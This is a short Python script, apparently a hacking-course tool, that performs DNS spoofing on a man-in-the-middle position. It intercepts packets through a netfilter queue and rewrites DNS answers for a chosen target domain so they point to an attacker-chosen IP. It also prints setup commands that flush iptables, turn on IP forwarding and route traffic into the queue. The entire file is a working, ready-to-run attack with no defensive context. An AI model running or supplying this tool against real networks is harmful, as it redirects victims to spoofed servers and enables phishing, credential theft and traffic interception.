#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target_domain", dest="target_domain", help="Select target domain")
    parser.add_option("-s", "--spoof_domain", dest="spoof_domain", help="Write spoof domain ip adress")
    (options, arguments) = parser.parse_args()

    if not options.target_domain:
        parser.error("[-] Please specify target domain, use --help for mor info.")
    elif not options.spoof_domain:
        parser.error("[-] Please specify gateway ip, use --help for mor info.")
    else:
        print(
            "[!] Remember to setup program before use: \n 1)iptables --flush\n 2)echo 1 > /proc/sys/net/ipv4/ip_forward\n 3)iptables -I FORWARD -j NFQUEUE --queue-num 0")

    return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.target_domain in qname.decode():
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.spoof_domain)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))


    packet.accept()

options = get_arguments()

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("[-] Detected CTRL+C ... Stopped spoofing target")